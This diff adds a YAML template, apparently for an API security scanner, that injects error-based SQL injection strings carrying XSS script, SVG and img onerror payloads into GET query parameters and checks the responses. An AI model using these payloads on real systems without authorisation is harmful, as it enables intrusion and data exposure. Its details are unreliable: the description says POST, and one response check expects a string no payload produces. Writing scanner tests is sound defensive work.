@@ -1,0 +1,191 @@
+id: ERROR_BASED_SQLI_XSS_GET
+info:
+  name: "Error based SQL Injection Test with XSS for GET method APIs"
+  description: "The Error-Based SQL Injection Test with XSS for GET Method APIs combines two common web vulnerabilities—SQL injection and cross-site scripting (XSS). In this test, an attacker injects malicious SQL code into POST request parameters to generate database errors that reveal sensitive information, such as database structure or credentials. Simultaneously, XSS payloads are injected into responses, potentially allowing the attacker to execute JavaScript in the user's browser. This can lead to unauthorized access to data, session hijacking, and security breaches, emphasizing the need for secure input validation and proper error handling."
+  details: "The Error-Based SQL Injection Test with XSS for GET Method APIs involves injecting malicious SQL queries and XSS payloads into GET request parameters. The SQL injection exploits the database error messages, which can provide valuable information about the database structure or the underlying system. Simultaneously, XSS payloads in the responses could allow an attacker to execute JavaScript in the victim's browser, potentially leading to session hijacking or unauthorized actions. The combination of these vulnerabilities can escalate the attack, resulting in significant data exposure and security risks. Proper input sanitization, error handling, and XSS prevention measures are essential to protect against these threats."
+  impact: "The impact of the Error-Based SQL Injection Test with XSS for GET Method APIs is critical, as it allows attackers to extract sensitive database information through error messages, leading to data leakage and system exposure. Additionally, by injecting XSS payloads, attackers can execute malicious scripts in users' browsers, enabling session hijacking, credential theft, and unauthorized actions. This combination can lead to severe security breaches, including full system compromise or data manipulation. To mitigate this, strong input validation, secure error handling, and XSS protection are necessary."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: ERROR_BASED_SQLI_XSS_GET
+  severity: CRITICAL
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+attributes:
+  nature: INTRUSIVE
+  plan: STANDARD
+  duration: FAST
+
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    eq: "GET"
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+
+  query_param:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  errorXSSPayloads:
+    - "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT('<script>alert(\"XSS\")</script>', FLOOR(RAND(0)*2)) AS a FROM information_schema.tables GROUP BY a) x) --"
+    - "' OR 1=1 UNION SELECT null,CONCAT('<svg/onload=alert(\"XSS\")>', 1/0) --"
+    - "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT('<img src=\"x\" onerror=\"alert('XSS')\">', FLOOR(RAND(0)*2)) AS a FROM information_schema.tables GROUP BY a) x) --"
+    - "' OR 1=1 UNION SELECT null,CONCAT('<script>alert(\"XSS\")</script>', 1/0) --"
+    - "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT('<svg/onload=alert(\"XSS\")>', FLOOR(RAND(0)*2)) AS a FROM information_schema.tables GROUP BY a) x) --"
+    - "' OR 1=1 UNION SELECT null,CONCAT('<img src=\"x\" onerror=\"alert('XSS')\">', 1/0) --"
+  errorXSSNegativePayloads:
+    - "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT('<script>alert(\"XSS\")</script>', FLOOR(RAND(0)*2)) AS a FROM information_schema.tables GROUP BY a) x) AND 1=0 --"
+    - "' OR 1=1 UNION SELECT null,CONCAT('<svg/onload=alert(\"XSS\")>', 1/0) AND 1=0  --"
+    - "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT('<img src=\"x\" onerror=\"alert('XSS')\">', FLOOR(RAND(0)*2)) AS a FROM information_schema.tables GROUP BY a) x)  AND 1=0 --"
+    - "' OR 1=1 UNION SELECT null,CONCAT('<script>alert(\"XSS\")</script>', 1/0)  AND 1=0 --"
+    - "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT('<svg/onload=alert(\"XSS\")>', FLOOR(RAND(0)*2)) AS a FROM information_schema.tables GROUP BY a) x)  AND 1=0 --"
+    - "' OR 1=1 UNION SELECT null,CONCAT('<img src=\"x\" onerror=\"alert('XSS')\">', 1/0)  AND 1=0 --"
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_query_param:
+            userKey: ${userVal}${errorXSSPayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              contains_either:
+                - "<script>alert(\"XSS\");</script>"
+                - "<svg/onload=alert(\"XSS\")>"
+                - "<img/src=\"x\"/onerror=\"alert('XSS')\">"
+              not_contains:
+                - Error
+                - Internal Server
+                - Fail
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - UNION
+                - SELECT
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_query_param:
+            userKey: ${userVal}${errorXSSNegativePayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Fail
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - UNION
+                - SELECT
+                - "<script>alert(\"XSS\");</script>"
+                - "<svg/onload=alert(\"XSS\")>"
+                - "<img/src=\"x\"/onerror=\"alert('XSS')\">"
+              neq: "${x1.response.body}"
+        - success: vulnerable
+        - failure: exit
